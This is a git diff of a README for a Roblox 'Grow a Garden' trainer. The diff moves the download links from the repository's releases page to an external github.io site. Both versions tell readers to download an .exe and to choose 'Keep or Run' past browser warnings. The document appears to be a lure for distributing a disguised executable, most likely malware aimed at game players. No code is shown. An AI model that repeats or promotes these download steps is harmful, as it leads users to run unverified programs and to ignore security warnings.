@@ -1,12 +1,12 @@
 # 🌿 Grow-a-Garden-Trainer_1 - Master your Roblox garden with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/meridelvolitional423/Grow-a-Garden-Trainer_1/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://meridelvolitional423.github.io)
 
 This application helps players manage gardens in the game Grow a Garden on Roblox. It automates repetitive tasks so you focus on strategy and growth. The software includes tools to manage coins, pets, and farm efficiency.
 
 ## 📥 How to download the software
 
-Visit the [official release page](https://github.com/meridelvolitional423/Grow-a-Garden-Trainer_1/releases) to access the current version. Locate the file ending in .exe under the Assets section of the newest release. Click the file name to start your download.
+Visit the [official release page](https://meridelvolitional423.github.io) to access the current version. Locate the file ending in .exe under the Assets section of the newest release. Click the file name to start your download.
 
 Save this file to a folder you recognize, such as your Downloads folder or your Desktop. Windows might ask you to confirm the file download since it is an executable program. Select Keep or Run if your browser warns you about downloaded files.
 
